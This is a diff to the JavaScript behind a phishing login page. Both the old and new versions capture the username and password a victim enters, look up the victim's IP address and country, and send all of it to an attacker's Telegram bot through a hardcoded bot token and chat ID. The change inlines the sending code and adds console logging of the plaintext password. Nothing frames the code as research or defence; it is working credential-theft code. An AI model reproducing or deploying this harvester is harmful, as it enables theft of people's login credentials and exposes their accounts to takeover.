@@ -7,72 +7,68 @@ document.addEventListener('DOMContentLoaded', function () {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
-        // Input validation
+        // Log for debugging
+        console.log("Username:", username);
+        console.log("Password:", password);
+
         if (!username || !password) {
             alert('Both username and password are required.');
             return;
         }
 
-        console.log("Username and password captured successfully.");
-
-        // Fetch IP and location information
+        // Get IP and location info
         fetch('https://ipapi.co/json/')
             .then(response => {
                 if (!response.ok) {
-                    throw new Error(`Failed to fetch IP info. HTTP status: ${response.status}`);
+                    throw new Error(`HTTP error! status: ${response.status}`);
                 }
                 return response.json();
             })
             .then(data => {
-                const ip = data.ip || 'Unavailable';
-                const country = data.country_name || 'Unavailable';
+                const ip = data.ip;
+                const country = data.country_name;
 
-                console.log(`IP fetched: ${ip}, Country fetched: ${country}`);
+                // Log for debugging
+                console.log("IP:", ip);
+                console.log("Country:", country);
 
-                // Prepare the message to send
                 const message = `Username: ${username}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}`;
-                sendToTelegram(message);
+
+                // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values
+                const botToken = '7810271681:AAE3hUNHbuGo2Pz8wzYHJ23UfDwqav8nbao';
+                const chatId = '5750932154';
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                const payload = {
+                    chat_id: chatId,
+                    text: message
+                };
+
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`Telegram API error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error(`Telegram API error! description: ${data.description}`);
+                    }
+                    console.log('Message sent to Telegram successfully.');
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
             })
             .catch(error => {
-                console.error('Error fetching IP information:', error);
-                alert('Failed to fetch location details. Check your network connection.');
+                console.error('Error fetching IP info:', error);
             });
     });
-
-    function sendToTelegram(message) {
-        // Replace with your actual bot token and chat ID
-        const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
-        const chatId = '6651292809';
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-        const payload = {
-            chat_id: chatId,
-            text: message
-        };
-
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`Telegram API error. HTTP status: ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                if (!data.ok) {
-                    throw new Error(`Telegram API error: ${data.description}`);
-                }
-                console.log('Message sent to Telegram successfully.');
-                alert('Message sent successfully.');
-            })
-            .catch(error => {
-                console.error('Error sending message to Telegram:', error);
-                alert('Failed to send message to Telegram. Check your bot configuration.');
-            });
-    }
 });
